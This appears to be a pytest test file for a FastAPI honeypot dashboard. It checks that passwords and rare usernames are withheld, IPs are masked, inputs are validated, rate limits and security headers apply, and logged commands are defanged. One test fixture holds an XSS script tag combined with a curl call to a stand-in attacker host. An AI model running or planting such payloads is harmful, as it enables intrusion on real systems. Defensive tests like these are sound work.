import json
import pytest
from app.main import create_app
from fastapi.testclient import TestClient
from app.queries import TOPS


def seed(client,event,count=3,password='shared-password'):
    for i in range(count):
        client.app.state.db.insert(event(ip=f'203.0.113.{i+1}',password=password))


def test_password_threshold_counts_distinct_ips(client,event):
    for _ in range(10):
        client.app.state.db.insert(event(password='private-typo'))
    seed(client,event)
    rows=client.get('/api/top/passwords?range=all').json()
    assert rows==[{'value':'shared-password','count':3,'distinct_ips':3}]
    assert client.get('/api/top/credentials').json()==[{'username':'root','password':'shared-password','count':3,'distinct_ips':3}]


def test_feed_and_every_noncredential_endpoint_never_leak_password(client,event):
    seed(client,event,password='unique-sensitive-marker')
    for path in ['/api/events','/api/map','/api/stats','/api/config']+[f'/api/top/{kind}' for kind in TOPS-{'passwords','credentials'}]:
        response=client.get(path)
        assert response.status_code==200,(path,response.text)
        assert 'unique-sensitive-marker' not in response.text
    payload=client.get('/api/events').json()
    assert all(set(e)<= {'id','ts','type','ip','username','country','country_code','lat','lon'} for e in payload)


def test_username_feed_threshold(client,event):
    client.app.state.db.insert(event(username='unique-user'))
    assert client.get('/api/events').json()[0]['username'] is None


def test_masked_credentials_not_truncated_into_public_secrets(client,event):
    seed(client,event,password='x'*500)
    assert client.get('/api/top/passwords').json()[0]['value']=='[masked]'


def test_xss_is_json_text_and_commands_defanged(client,event):
    client.app.state.db.insert(event(eventid='cowrie.command.input',input='<script>alert(1)</script>; curl http://evil.example/a'))
    text=client.get('/api/top/commands').json()[0]['value']
    assert 'hxxp://evil[.]example/a' in text
    assert client.get('/').headers['content-security-policy'].find("script-src 'self'")>=0


@pytest.mark.parametrize('path',['/api/map?range=drop%20table','/api/stats?range=2h','/api/events?limit=101','/api/events?limit=-1','/api/events?limit=bad','/api/top/other','/api/stream'])
def test_validation(client,path):
    headers={'Last-Event-ID':'bad'} if path=='/api/stream' else {}
    assert client.get(path,headers=headers).status_code in {404,422}


def test_read_only_and_security_headers(client):
    for method in ['post','put','delete','patch','head','options']:
        assert getattr(client,method)('/api/stats').status_code==405
    response=client.get('/healthz')
    assert response.json()['status']=='ok'
    assert response.headers['x-content-type-options']=='nosniff'
    assert 'server' not in response.headers


def test_ip_masking(settings,event):
    settings.mask_ips=True
    with TestClient(create_app(settings,background=False)) as client:
        seed(client,event)
        for path in ['/api/map','/api/events','/api/top/ips']:
            text=client.get(path).text
            assert '203.0.113.1' not in text and '203.0.113.0/24' in text


def test_rate_limit(settings):
    settings.rate_per_minute=2
    with TestClient(create_app(settings,background=False)) as c:
        assert c.get('/api/stats').status_code==200
        assert c.get('/api/stats').status_code==200
        assert c.get('/api/stats').status_code==429


def test_sse_limit(client):
    client.app.state.streams['testclient']=3
    assert client.get('/api/stream').status_code==429


def test_no_private_username_before_threshold(client,event):
    client.app.state.db.insert(event(username='only-me'))
    assert client.get('/api/top/usernames').json()==[]


def test_required_log_permission_failure_marks_unhealthy(client):
    client.app.state.tailer.last_error='Log file unavailable'
    assert client.get('/healthz').status_code==503
    assert 'unavailable' in client.get('/healthz').text.lower()


def test_global_sse_limit(client):
    client.app.state.streams['other-client']=100
    assert client.get('/api/stream').status_code==429
